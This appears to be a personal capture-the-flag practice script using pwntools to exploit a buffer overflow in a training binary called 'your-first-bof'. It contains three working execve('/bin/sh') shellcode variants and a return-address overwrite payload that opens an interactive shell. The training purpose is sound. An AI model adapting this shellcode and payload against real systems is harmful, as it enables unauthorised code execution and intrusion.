# The first shellcode works (2024-05-15 Wed)

from pwn import *

# context.log_level = 'debug'

p = process('./your-first-bof')
# p = remote('141.164.48.98', '30003')

# shellcode = asm(shellcraft.execve('/bin/sh', 0, 0))

# asm1 works
shellcode_asm = ''' 
    push 0x68732f 
    push 0x6e69622f

    mov ebx, esp

    xor ecx, ecx
    xor edx, edx

    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
'''

# asm2 works
shellcode_asm = ''' 
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f

    mov ebx, esp

    push eax
    push ebx
    
    mov ecx, esp

    mov al, 0xb
    int 0x80
'''

# asm3 works
shellcode_asm = ''' 
    push 0x68732f
    push 0x6e69622f

    mov ebx, esp

    xor ecx, ecx
    xor edx, edx

    mov al, 0xb
    int 0x80
'''

shellcode = asm(shellcode_asm)
print(f'the length of your shellcode is {len(shellcode)}')

p.recvuntil(b':')
addr1 = int(p.recvline(), 16)

p.recvuntil(b':')
addr2 = int(p.recvline(), 16)

p.recvuntil(b'>>>')
p.sendline(shellcode[0:16])

p.recvuntil(b'>>>')
p.sendline(shellcode[16:])

print(hex(addr1), '\n', hex(addr2))
print(f'shellcode len: {len(shellcode)}')

addr = addr1
payload = b''
payload += b'A' * 0x1C
payload += addr.to_bytes(4, 'little')

p.recvuntil(b':')

# pause()
p.sendline(payload)

p.interactive()
